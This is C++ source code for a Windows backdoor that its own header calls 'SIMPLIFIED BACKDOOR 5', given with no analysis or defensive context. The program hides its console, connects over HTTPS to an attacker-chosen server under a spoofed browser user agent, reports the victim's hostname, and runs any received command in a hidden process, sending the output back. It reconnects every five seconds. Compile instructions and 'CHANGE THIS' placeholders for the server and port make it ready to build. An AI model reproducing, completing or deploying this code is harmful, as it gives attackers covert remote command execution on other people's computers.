// SIMPLIFIED BACKDOOR 5: WebSocket-like using WinHTTP (No Boost)
// WEBSOCKET-LIKE SHELL USING WINHTTP - NO BOOST NEEDED
// Compile: g++ backdoor5_simple.cpp -o backdoor5.exe -lwinhttp -static

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <thread>
#pragma comment(lib, "winhttp.lib")

#define SERVER L"your-server.com"  // CHANGE THIS (wide string)
#define PORT 8765                    // CHANGE THIS
#define PATH L"/shell"               // CHANGE THIS

class WebSocketShell {
private:
    HINTERNET hSession;
    HINTERNET hConnect;
    HINTERNET hRequest;
    
    std::string ExecuteCommand(const char* cmd) {
        std::string result;
        
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hRead, hWrite;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
            return "Error creating pipe";
        
        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        
        PROCESS_INFORMATION pi;
        
        char* cmdMutable = _strdup(cmd);
        
        if (CreateProcessA(NULL, cmdMutable, NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hRead, buffer, sizeof(buffer)-1, &bytesRead, NULL) 
                   && bytesRead > 0) {
                buffer[bytesRead] = 0;
                result += buffer;
            }
        }
        
        free(cmdMutable);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        
        return result.empty() ? "[OK]" : result;
    }
    
    bool Connect() {
        hSession = WinHttpOpen(L"Mozilla/5.0", 
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, 
            WINHTTP_NO_PROXY_BYPASS, 0);
        
        if (!hSession) return false;
        
        hConnect = WinHttpConnect(hSession, SERVER, PORT, 0);
        if (!hConnect) return false;
        
        hRequest = WinHttpOpenRequest(hConnect, L"GET", PATH, 
            NULL, WINHTTP_NO_REFERER, 
            WINHTTP_DEFAULT_ACCEPT_TYPES, 
            WINHTTP_FLAG_SECURE);  // HTTPS
        
        if (!hRequest) return false;
        
        // Send request
        if (!WinHttpSendRequest(hRequest, 
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            return false;
        }
        
        return WinHttpReceiveResponse(hRequest, NULL);
    }
    
    bool SendData(const std::string& data) {
        DWORD bytesWritten;
        return WinHttpWriteData(hRequest, data.c_str(), data.length(), &bytesWritten);
    }
    
    std::string ReceiveData() {
        char buffer[4096];
        DWORD bytesRead;
        std::string result;
        
        if (WinHttpReadData(hRequest, buffer, sizeof(buffer)-1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = 0;
            result = buffer;
        }
        return result;
    }
    
public:
    WebSocketShell() {
        FreeConsole();
    }
    
    ~WebSocketShell() {
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);
    }
    
    void Run() {
        while (true) {
            if (!Connect()) {
                Sleep(5000);
                continue;
            }
            
            // Send system info
            char hostname[256];
            gethostname(hostname, sizeof(hostname));
            SendData(std::string("[CONNECT] ") + hostname);
            
            while (true) {
                std::string cmd = ReceiveData();
                
                if (cmd.empty()) break;
                if (cmd == "exit") break;
                
                std::string output = ExecuteCommand(cmd.c_str());
                SendData(output);
            }
            
            Sleep(5000);
        }
    }
};

int main() {
    WebSocketShell shell;
    shell.Run();
    return 0;
}